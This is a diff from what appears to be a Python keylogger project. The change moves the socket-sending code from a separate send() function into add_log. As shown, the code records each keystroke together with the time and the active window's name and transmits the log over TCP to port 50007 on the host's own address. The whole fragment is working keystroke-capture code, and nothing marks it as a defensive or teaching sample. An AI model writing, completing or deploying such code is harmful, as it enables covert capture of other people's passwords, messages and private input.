@@ -7,15 +7,6 @@ from sys import setrecursionlimit
 
 log = ''
 
-# Function that send the current log to the working service
-def send():
-    global log
-    server = socket(AF_INET, SOCK_STREAM)
-    server.connect((gethostbyname(gethostname()), 50007))
-    log = log.encode('utf-8')
-    server.send(log)
-    log = ''
-
 # Function to put the date, the name of the active window and the key in the log
 def add_log(skey):
     global log
@@ -29,7 +20,12 @@ def add_log(skey):
         window_name = "Not found"
 
     log += "\n" +  current_time_hour + ":" + current_time_minute + ":" + current_time_second + " | " + window_name + ": " + skey
-    send()
+    # Send the current log to the working service
+    server = socket(AF_INET, SOCK_STREAM)
+    server.connect((gethostbyname(gethostname()), 50007))
+    log = log.encode('utf-8')
+    server.send(log)
+    log = ''
 
 # Function that transform what the user types and send it to add_log function
 def press(key):
